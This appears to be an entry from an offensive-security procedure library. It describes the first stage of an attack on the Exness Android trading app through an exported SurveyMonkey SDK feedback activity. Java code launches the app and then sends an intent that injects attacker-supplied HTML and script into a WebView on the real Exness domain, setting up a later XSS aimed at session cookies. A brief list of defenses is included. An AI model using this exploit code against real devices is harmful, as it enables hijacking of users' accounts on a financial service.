---
tags:
  - android
  - intent-launch
  - redirect
type: procedure
tools:
  - '[[tools/SurveyMonkey-Android-SDK]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/launch-exness-intent]]'
  - '[[commands/initial-payload-intent]]'
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:31.931Z'
sub_techniques: []
id: 93a958b4-5ca9-49ad-a47f-d22eb6565bbf
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Launch-Exness-App-and-Initial-Payload

## Summary

This procedure opens the Exness app and launches the SMFeedbackActivity with an initial benign payload to load the target site in the WebView.

## Description

Using getLaunchIntentForPackage starts the Exness app, followed by a delayed intent to SMFeedbackActivity with smSPageHTML containing a redirect script and smSPageURL set to https://my.exness.asia/r/, ensuring the WebView context is set for subsequent XSS.

## Requirements

1. Both apps installed
2. Android context with package manager access
3. User logged in to Exness for cookie population

## Defense

Defensive measures and detection strategies:

- Validate Intent Extras before loading in WebView
- Disable JavaScript or sanitize HTML inputs
- Audit exported activities in manifest

## Objectives

1. Activate Exness session
2. Set WebView baseURL for cookie access
3. Prepare for XSS injection

## Instructions

### Step 1: Launch Exness App

**Context**: Ensure the target app is running to load user session.

Execute [[commands/launch-exness-intent]]:

```java
Intent exnessIntent = getPackageManager().getLaunchIntentForPackage("com.exness.investments"); startActivity(exnessIntent);
```

> Explanation: Launches the main activity of com.exness.investments. Expected output: Exness app foregrounded.

### Step 2: Trigger Initial Payload

**Context**: After 8-second delay, load redirect in WebView.

Execute [[commands/initial-payload-intent]]:

```java
final Intent intent = new Intent("android.intent.action.VIEW"); intent.putExtra("smSPageHTML","<h1>Exploited</h1><script>location.href='/r/'</script>"); intent.putExtra("smSPageURL","https://my.exness.asia/r/"); intent.setClassName(createPackageContext("com.exness.investments",Context.CONTEXT_IGNORE_SECURITY),"com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity"); new Handler().postDelayed(new Runnable(){ @Override public void run(){ startActivity(intent); } },8000);
```

> Explanation: Sets malicious HTML and URL, targets activity explicitly. Expected output: WebView redirects to /r/.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/launch-exness-intent]]
- [[commands/initial-payload-intent]]

## Tools Used

- [[tools/SurveyMonkey-Android-SDK]]

## Tags

- android
- intent-launch
- redirect
